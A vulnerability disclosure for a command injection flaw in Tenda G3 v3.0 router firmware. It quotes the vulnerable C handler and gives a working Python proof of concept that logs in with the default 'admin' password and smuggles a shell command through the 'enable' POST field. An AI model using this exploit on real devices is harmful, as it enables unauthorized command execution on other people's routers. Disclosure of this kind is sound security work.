**First of all, you can see more detailed demonstration effects in exp.mkv**

## Affected Version
* <=Tenda-G3v3.0 V15.11.0.20

## Vulnerability Description
Tenda-G3v3.0 V15.11.0.20  was discovered to contain command injection  at url **/goform/setDebugCfg**

## Vulnerability Details
In the function **formSetDebugCfg**, there is the following code, the value of **enable,level,module** comes from the user's post request.
```c
pEnable = websGetVar(wp, "enable", "2");
pLevel = websGetVar(wp, "level", "2");
pModule = websGetVar(wp, "module", "httpd");
sprintf(
    (char *)cmd,
    "echo enable=%s level=%s > /var/debug/%s",
    (const char *)pEnable,
    (const char *)pLevel,
    (const char *)pModule);
  system((const char *)cmd);
```

Because there is **no filtering**, and the values ​​of **enable, level, and module** come from the user's post request, it is easy to cause a **command injection** vulnerability.

## exp
It should be noted that you need to login before accessing /goform/setDebugCfg, so you need to login before posting the request.

```python
import requests

session = requests.Session()


login_url = "http://192.168.0.252/login/Auth"
headers = {
    "Host": "192.168.0.252",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.0.252",
    "Connection": "close",
    "Referer": "http://192.168.0.252/login.asp",
    "Cookie": "_:USERNAME:_=; G3v3_user=",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

login_data = {
    "password": "YWRtaW4="  # base64 encoded 'admin'
}

response = session.post(login_url, headers=headers, data=login_data)
print(response.text)

# formSetDebugCfg
url = "http://192.168.0.252/goform/setDebugCfg"
data = {"enable": "\necho PWN!!! > /webroot/helpData.html\n"}
response = session.post(url, data=data)


print(response.text)
```

## Any suggested solutions to fix
**Reasonably filter the values ​​of the three variables enable, level, and module from the user's post request**
